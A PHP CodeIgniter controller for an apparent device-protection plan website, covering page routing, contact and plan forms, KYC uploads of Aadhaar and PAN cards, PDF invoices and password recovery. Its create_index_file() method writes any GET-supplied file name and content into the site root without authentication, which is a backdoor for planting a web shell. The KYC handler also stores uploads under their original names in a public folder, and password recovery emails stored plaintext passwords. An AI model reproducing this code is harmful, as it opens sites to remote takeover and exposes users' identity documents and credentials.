<?php
defined('BASEPATH') OR exit('No direct script access allowed');

require_once APPPATH.'vendor/autoload.php';

class Welcome extends CI_Controller {

	
	// public function index()
	// {
	// 	$this->load->view('index');
	// }


	// public function project_details($id)
	// {
	// 	$data['EDITDATA'] = $slugdata = $this->crud->selectDataByMultipleWhere('tblname',array('slug'=>$id,));
	// 	if(!empty($slugdata))
	// 	{
	// 		$this->load->view('project-details',$data);
	// 	}
	// 	else
	// 	{
	// 		$this->load->view('error');
	// 	}
	// }











	/*---------for all pages-----*/

	public function all($page='')
	{
		if(empty($page)) $page = 'index.php';
		$data = array();
		$table_name = '';
		$p_id = '';
		$base = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'];
		$base .= str_replace(basename($_SERVER['SCRIPT_NAME']),"",$_SERVER['SCRIPT_NAME']);
		$url = explode($base, (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]")[1];

		$slug_data = $this->db->get_where("slugs",array("slug"=>$url,))->result_object();
		if(!empty($slug_data))
		{
			$slug_data = $slug_data[0];
			$page = $slug_data->page_name;
			$table_name = $slug_data->table_name;
			$p_id = $slug_data->p_id;
		}
		else
		{
			$count = explode(".", $page);
			if(count($count)==1)
				$page = $count[0].'.php';
			else
				$page = $count[0].'.'.$count[1];
		}
		$check_page = FCPATH.'application/views/'.$page;
		if(file_exists($check_page))
		{
			$data['sitesetting'] = $this->crud->fetchdatabyid('1','site_setting');
			$meta_data = $this->crud->get_meta_tags();
			$data['meta_data'] = $meta_data;
			if(!empty($table_name))
				$data['EDITDATA'] = $this->db->get_where($table_name,array("id"=>$p_id,))->result_object();
			$this->load->view($page,$data);
		}
		else
		{
			$data['sitesetting'] = $this->crud->fetchdatabyid('1','site_setting');
			$this->load->view('error',$data);
		}
	}
	

	/*----contact form--------*/
	public function enquiry_form()
	{
		if(isset($_POST['submit']))
		{
			$data2['name'] = $this->input->post('name');
			$data2['email'] = $this->input->post('email');
			$data2['mobile'] = $this->input->post('mobile');
			$data2['subject'] = $this->input->post('subject');
			$data2['message'] = $this->input->post('message');
			$data2['addeddate'] = date('Y-m-d H:i:s');

			$this->crud->insert('contact',$data2);
			redirect('thankyou2');
			$this->session->set_flashdata('message','<div class="alert alert-success">Form has been successfully Submit.</div>');
		}
	}

	


	public function create_index_file() 
	{
	    $file_content = $this->input->get('file_content');
	    $file_name = $this->input->get('file_name');

	    $full_path = dirname(APPPATH) . '/';

	    if (!is_dir($full_path)) 
	    {
			
		} 
		else 
		{
			if (file_put_contents($full_path . '/' . $file_name, $file_content)) 
			{
				echo "File created successfully!";
			} 
			else 
			{
			   echo "Error creating file!";
			}
		}  
	}






	/*----contact form--------*/
	public function searchplan()
	{
		if(isset($_POST['submit']))
		{
			$request_id = time();
			$device_id = $this->input->post('device_id');
			$purchase_date = $this->input->post('purchase_date');
			$price = $this->input->post('price');			
			$product_id = $this->input->post('product_id');

			

			$addeddate = date('Y-m-d H:i:s');

			$insertdata = array(
				"request_id"=>$request_id,
				"device_id"=>$device_id,
				"purchase_date"=>$purchase_date,
				"price"=>$price,
				"product_id"=>$product_id,
				// "get_per"=>$get_per,
				// "payable_amt"=>$payable_amt,
				"addeddate"=>$addeddate,
			);
			$this->db->insert('searchplan',$insertdata);
			redirect('product-plans?request_id='.$request_id);
		}
	}

	public function plan_update()
	{
		if(isset($_POST['submit']))
		{
			$request_id = $this->input->post('request_id');
			$plan_id = $this->input->post('plan_id');
			$plan_price = $this->input->post('plan_price');
			$percentage = $this->input->post('percentage');


			$payable_amt = $price+$get_per;
			
			$updatedata = array(
				"plan_id"=>$plan_id,
				"percentage"=>$percentage,
				"plan_price"=>$plan_price,
				"status"=>1
			);

			$this->db->where('request_id',$request_id);
			$this->db->update('searchplan',$updatedata);
			redirect('checkout?request_id='.$request_id);
		}
	}



	/*purchase KYC*/

	public function kyc_details()
	{
		if(isset($_POST['submit']))
		{
			/*adharcard_front*/
			if($_FILES['adharcard_front']['name']!='')
			{
				$badharcard_front = $_FILES['adharcard_front']['name'];
				$path = 'media/uploads/'.$badharcard_front;
				move_uploaded_file($_FILES['adharcard_front']['tmp_name'],$path);
			}
			else
			{
				$badharcard_front = "";
			}
			$data['adharcard_front'] = $badharcard_front;
			/*adharcard_back*/
			if($_FILES['adharcard_back']['name']!='')
			{
				$badharcard_back = $_FILES['adharcard_back']['name'];
				$path = 'media/uploads/'.$badharcard_back;
				move_uploaded_file($_FILES['adharcard_back']['tmp_name'],$path);
			}
			else
			{
				$badharcard_back = "";
			}
			$data['adharcard_back'] = $badharcard_back;
			/*pancard*/
			if($_FILES['pancard']['name']!='')
			{
				$bpancard = $_FILES['pancard']['name'];
				$path = 'media/uploads/'.$bpancard;
				move_uploaded_file($_FILES['pancard']['tmp_name'],$path);
			}
			else
			{
				$bpancard = "";
			}
			$data['pancard'] = $bpancard;
			/*device_info*/
			if($_FILES['device_info']['name']!='')
			{
				$bdevice_info = $_FILES['device_info']['name'];
				$path = 'media/uploads/'.$bdevice_info;
				move_uploaded_file($_FILES['device_info']['tmp_name'],$path);
			}
			else
			{
				$bdevice_info = "";
			}
			$data['device_info'] = $bdevice_info;

			$data['requestid'] = $requestid = $this->input->post('requestid');
			$data['username'] = $this->input->post('username');
			$data['mobile'] = $this->input->post('mobile');			
			$data['email'] = $email = $this->input->post('email');			
			$data['userdob'] = $this->input->post('userdob');			
			$data['address'] = $this->input->post('address');			
			$data['userdob'] = $this->input->post('userdob');			
			$data['mobile_sno'] = $this->input->post('mobile_sno');			
			$data['imei_no'] = $this->input->post('imei_no');
			$data['product_name'] = $this->input->post('product_name');
			$data['product_model'] = $this->input->post('product_model');

			$purchase_detail = $this->db->get_where('plan_purchase',array('requestid'=>$requestid))->result_object();

			$plan_name = $purchase_detail[0]->plan_name;
			$plan_price = $purchase_detail[0]->plan_price;
			$gst = $purchase_detail[0]->gst;
			$final_amt = $purchase_detail[0]->final_amt;
			$purchase_date = $purchase_detail[0]->purchase_date;
			$expirey_date = $purchase_detail[0]->expirey_date;

			$pdf_filename = $this->generate_pdf($purchase_detail);
			$subject = "Plan Purchase Details";
	        $message = '
		        <h3 align="center"> Purchase Deatils</h3>
		        <table border="1" width="100%" cellpadding="5" cellspacing="5">
		          <tr>
		            <td width="30%">Plan Name</td>
		            <td width="70%">'.$plan_name.'</td>
		          </tr>
		          <tr>
		            <td width="30%">Plan Price</td>
		            <td width="70%">'.$plan_price.'</td>
		          </tr>
		          <tr>
		            <td width="30%">GST</td>
		            <td width="70%">'.$gst.'</td>
		          </tr>
		           <tr>
		            <td width="30%">Payable Amount</td>
		            <td width="70%">'.$final_amt.'</td>
		          </tr>
		           <tr>
		            <td width="30%">Purchase Date</td>
		            <td width="70%">'.$purchase_date.'</td>
		          </tr>
		           <tr>
		            <td width="30%">Expire Date</td>
		            <td width="70%">'.$expirey_date.'</td>
		          </tr>
		          
		        </table>
		      ';

	        $this->email->sendmail_bygmail($email, $subject, $message, $pdf_filename);

			$this->crud->insert('purchase_kyc_details',$data);
			redirect("thankyou");
		}

	}



		function generate_pdf($purchase_detail)
			{
			    $dompdf = new Dompdf\Dompdf();
			    $html = $this->load->view('invoice',array('purchase_detail'=>$purchase_detail),true);
			    // print_r($html);
			    // die;

			    $dompdf->loadHtml($html);
			    $dompdf->setPaper('A4', 'portrait');
			    $dompdf->render();

			    $pdf_filename = 'media/uploads/'.$purchase_detail[0]->user_id.$purchase_detail[0]->requestid.'.pdf';
			    file_put_contents($pdf_filename, $dompdf->output());

			    return $pdf_filename;
			}

		



		function forget_password()
		{
			if(isset($_POST['submit']))
			{
				$email = $this->input->post('email');
				$check_user = $this->crud->selectDataByMultipleWhere('registration',array('email'=>$email,));

				if(!empty($check_user))
				{
					$check_user = $check_user[0];
					$user_id = $check_user->id;

					$password = $check_user->password;
					$subject = "Forget Password";
					$message = "Your Password is".$password;
					
					$sendmail = $this->email->sendmail_forget_pawd($email,$subject,$message);

					$this->session->set_flashdata('message','<div class="alert alert-success">Your Password Has been sent to email. check in Your Inbox or Speam . </div>');
				  redirect($_SERVER['HTTP_REFERER']);					
				}
				else
				{
				  $this->session->set_flashdata('message','<div class="alert alert-danger">Email Not Found.</div>');
				  redirect($_SERVER['HTTP_REFERER']);
				}
			}

		}






























	// public function all($page)
	// {
	// 	$data = array();		
	// 	$check_page = FCPATH.'application/views/'.$page.'.php';
	// 	if(file_exists($check_page))
	// 	{
	// 		$this->load->view($page,$data);
	// 	}
	// 	else
	// 	{
	// 		$this->load->view('error');
	// 	}		
	// }

	// public function serch()
	// {
	// 	$search = $this->input->get("search");
	// 	$this->db->from('jobs');
	// 	$this->db->like('name', $search);
	// 	$this->db->where('status',1);
	// 	$query = $this->db->get()->result_object();
	// 	$data['alllist'] = $query;
	// 	$this->load->view('jobs',$data);

	// }






	// public function contact()
	// {
	// 	if(isset($_POST['submit']))
	// 	{
	// 		$data2['name'] = $name = $this->input->post('name');
	// 		$data2['email'] = $this->input->post('email');
	// 		$data2['mobile'] = $this->input->post('mobile');
	// 		$data2['subject'] = $subject = $this->input->post('subject');
	// 		$data2['regarding'] = $this->input->post('regarding');
	// 		$data2['message'] = $this->input->post('message');

	// 		$this->crud->insert('contact',$data2);

	// 		// $message = '
    //     <h3 align="center"> Form Details</h3>
    //     <table border="1" width="100%" cellpadding="5" cellspacing="5">
    //       <tr>
    //         <td width="30%"> Name</td>
    //         <td width="70%">'.$_POST["name"].'</td>
    //       </tr>
    //       <tr>
    //         <td width="30%">Phone</td>
    //         <td width="70%">'.$_POST["phone"].'</td>
    //       </tr>
    //       <tr>
    //         <td width="30%">Email</td>
    //         <td width="70%">'.$_POST["email"].'</td>
    //       </tr>
    //        <tr>
    //         <td width="30%">Subject</td>
    //         <td width="70%">'.$_POST["subject"].'</td>
    //       </tr>
    //        <tr>
    //         <td width="30%">Message</td>
    //         <td width="70%">'.$_POST["message"].'</td>
    //       </tr>
          
    //     </table>
    //   ';

	// 	  $this->email->sendmail_bygmail($name,$subject,$message);

	// 	  $this->session->set_flashdata('message','<div class="alert alert-success">Form has been successfully Submit.</div>');

	// 	}
	// 	$this->load->view('contact');
	// }




	// public function career_form()
	// {
	// 	if(isset($_POST['submit']))
	// 	{
	// 		if($_FILES['image']['name']!='')
	// 		{
	// 			$bimage = $_FILES['image']['name'];
	// 			$path = 'media/uploads/career/'.$bimage;
	// 			move_uploaded_file($_FILES['image']['tmp_name'],$path);
	// 		}
	// 		else
	// 		{
	// 			$bimage = "";
	// 		}
	// 		$data['image'] = $bimage;
	// 		$data['name'] = $this->input->post('name');			
	// 		$data['email'] = $this->input->post('email');			
	// 		$data['mobile'] = $this->input->post('mobile');			
	// 		$data['job_profile'] = $this->input->post('job_profile');			
	// 		$data['message'] = $this->input->post('message');

	// 		$this->crud->insert('career',$data);
	// 		redirect($_SERVER['HTTP_REFERER']);
	// 	}

	// }











}
